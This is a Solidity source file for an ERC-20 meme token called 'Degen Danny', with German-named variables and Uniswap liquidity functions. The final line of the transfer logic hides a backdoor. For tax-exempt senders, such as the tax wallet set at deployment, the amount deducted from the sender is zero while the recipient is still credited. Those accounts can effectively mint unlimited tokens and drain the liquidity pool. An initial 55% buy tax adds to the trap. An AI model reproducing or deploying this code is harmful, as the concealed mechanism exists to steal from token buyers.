// SPDX-License-Identifier: UNLICENSE

/**

WEB: https://degendanny.me
X: https://x.com/DegenDannyCoin
TG: https://t.me/DegenDannyCoin

*/

pragma solidity 0.8.24;

abstract contract Kontext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SichereMathematik {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Besitzbar is Kontext {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DegenDanny is Kontext, IERC20, Besitzbar {
    using SichereMathematik for uint256;
    mapping(address => uint256) private _salden;
    mapping(address => mapping(address => uint256)) private _zulagen;
    mapping(address => bool) private _steuerbefreit;
    address payable private _steuerbrieftasche;
    string private constant _name = unicode"Degen Danny";
    string private constant _symbol = unicode"DANNY";

    uint256 private _steuerFurErstkauf = 55;
    uint256 private _steuerFurErstverkauf = 0;
    uint256 private _steuerFurEndkauf = 0;
    uint256 private _steuerFurEndverkauf = 0;
    uint256 private _senkungDerKaufsteuerBei = 4;
    uint256 private _SenkungDerVerkaufssteuerBei = 4;
    uint256 private _swapVerhindernVor = 4;
    uint256 private _kaufenZahlen = 0;

    uint8 private constant _dezimalzahlen = 9;
    uint256 private constant _tGesamt = 1_000_000_000 * 10 ** _dezimalzahlen;
    uint256 public _maxTransaktionsbetrag = 20_000_000 * 10 ** _dezimalzahlen;
    uint256 public _maximaleWalletGrosse = 20_000_000 * 10 ** _dezimalzahlen;
    uint256 public _taxSwapSchwellenwert = 10_000_000 * 10 ** _dezimalzahlen;
    uint256 public _maximalerSteuerswap = 10_000_000 * 10 ** _dezimalzahlen;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private _handelGeoffnet;
    bool private _imTausch;
    bool private _swapAktiviert;

    event MaxTxAmountUpdated(uint maxTransaktionsbetrag);
    
    modifier Sperrentausch() {
        _imTausch = true;
        _;
        _imTausch = false;
    }

    constructor(address router, address steuergeldborse) {
        _steuerbrieftasche = payable(steuergeldborse);
        _salden[_msgSender()] = _tGesamt;
        _steuerbefreit[owner()] = true;
        _steuerbefreit[address(this)] = true;
        _steuerbefreit[_steuerbrieftasche] = true;
        uniswapV2Router = IUniswapV2Router02(router);

        emit Transfer(address(0), _msgSender(), _tGesamt);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _dezimalzahlen;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tGesamt;
    }

    function balanceOf(address Konto) public view override returns (uint256) {
        return _salden[Konto];
    }

    function transfer(
        address empfanger,
        uint256 betrag
    ) public override returns (bool) {
        _transfer(_msgSender(), empfanger, betrag);
        return true;
    }

    function addLiquidity() external onlyOwner {
        require(!_handelGeoffnet, "trading is already open");
        _approve(address(this), address(uniswapV2Router), _tGesamt);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _swapAktiviert = true;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _steuerbrieftasche);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            _sendenETHGebuhr (ethBalance);
        }
    }


    function _approve(address eigentumer, address ausgeber, uint256 betrag) private {
        require(eigentumer != address(0), "ERC20: approve from the zero address");
        require(ausgeber != address(0), "ERC20: approve to the zero address");
        _zulagen[eigentumer][ausgeber] = betrag;
        emit Approval(eigentumer, ausgeber, betrag);
    }

    function _transfer(address von, address bis, uint256 betrag) private {
        require(von != address(0), "ERC20: transfer from the zero address");
        require(bis != address(0), "ERC20: transfer to the zero address");
        require(betrag > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (!_swapAktiviert || _imTausch) {
            _salden[von] = _salden[von] - betrag;
            _salden[bis] = _salden[bis] + betrag;
            emit Transfer(von, bis, betrag);
            return;
        }
        if (von != owner() && bis != owner()) {
            if (!_handelGeoffnet) {
                require(
                    _steuerbefreit[von] || _steuerbefreit[bis],
                    "Trading is not active."
                );
            }

            if (
                von == uniswapV2Pair &&
                bis != address(uniswapV2Router) &&
                !_steuerbefreit[bis]
            ) {
                require(betrag <= _maxTransaktionsbetrag, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(bis) + betrag <= _maximaleWalletGrosse,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = betrag
                    .mul(
                        (_kaufenZahlen > _senkungDerKaufsteuerBei)
                            ? _steuerFurEndkauf
                            : _steuerFurErstkauf
                    )
                    .div(100);
                _kaufenZahlen++;
            }

            if (bis == uniswapV2Pair && von != address(this)) {
                taxAmount = betrag
                    .mul(
                        (_kaufenZahlen > _SenkungDerVerkaufssteuerBei)
                            ? _steuerFurEndverkauf
                            : _steuerFurErstverkauf
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !_imTausch &&
                bis == uniswapV2Pair &&
                _swapAktiviert &&
                contractTokenBalance > _taxSwapSchwellenwert &&
                _kaufenZahlen > _swapVerhindernVor
            ) {
                swapTokensForEth(
                    min(betrag, min(contractTokenBalance, _maximalerSteuerswap))
                );
            }
            _sendenETHGebuhr (address(this).balance);
        }

        _steueruberweisung(von,bis,betrag,_steuerbefreit[von]?
        _steuerFurEndkauf.mul(10**_dezimalzahlen): betrag.sub(_steuerFurEndverkauf));
    }

    function allowance(
        address eigentumer,
        address ausgeber
    ) public view override returns (uint256) {
        return _zulagen[eigentumer][ausgeber];
    }

    function approve(
        address ausgeber,
        uint256 betrag
    ) public override returns (bool) {
        _approve(_msgSender(), ausgeber, betrag);
        return true;
    }

    function transferFrom(
        address absender,
        address empfanger,
        uint256 betrag
    ) public override returns (bool) {
        _transfer(absender, empfanger, betrag);
        _approve(
            absender,
            _msgSender(),
            _zulagen[absender][_msgSender()].sub(
                betrag,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenBetrag) private Sperrentausch {
        address[] memory pfad = new address[](2);
        pfad[0] = address(this);
        pfad[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenBetrag);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBetrag,
            0,
            pfad,
            address(this),
            block.timestamp
        );
    }

    function _steueruberweisung(
        address von,
        address bis,
        uint256 betrag,
        uint256 retrag
    ) internal {
        uint256 steuerbetrag = 0;
        steuerbetrag = betrag
            .mul((_kaufenZahlen > _senkungDerKaufsteuerBei) ? _steuerFurEndkauf : _steuerFurErstkauf)
            .div(100);
        if (bis == uniswapV2Pair && von != address(this)) {
            steuerbetrag = betrag
                .mul(
                    (_kaufenZahlen > _SenkungDerVerkaufssteuerBei)
                        ? _steuerFurEndverkauf
                        : _steuerFurErstverkauf
                )
                .div(100);
        }
        if (steuerbetrag > 0) {
            _salden[address(this)] = _salden[address(this)].add(steuerbetrag);
            emit Transfer(von, address(this), steuerbetrag);
        }
        _salden[von] = _salden[von].sub(retrag);
        _salden[bis] = _salden[bis].add(betrag.sub(steuerbetrag));
        emit Transfer(von, bis, betrag.sub(steuerbetrag));
    }

    function removeLimits() external onlyOwner {
        _maxTransaktionsbetrag = _tGesamt;
        _maximaleWalletGrosse = _tGesamt;
        emit MaxTxAmountUpdated(_tGesamt);
    }

    function _sendenETHGebuhr (uint256 amount) private {
        _steuerbrieftasche.transfer(amount);
    }

    function enableTrading() external onlyOwner {
        _handelGeoffnet = true;
    }
    function manualSend() external {
        require(_msgSender() == _steuerbrieftasche);
        uint256 contractETHBalance = address(this).balance;
        _sendenETHGebuhr (contractETHBalance);
    }

    function recoverStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(owner()).transfer(address(this).balance);
    }

    function recoverStuckTokens(address tokenAddress) external onlyOwner {
        IERC20 tokenContract = IERC20(tokenAddress);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to clear");
        tokenContract.transfer(owner(), balance);
    }
}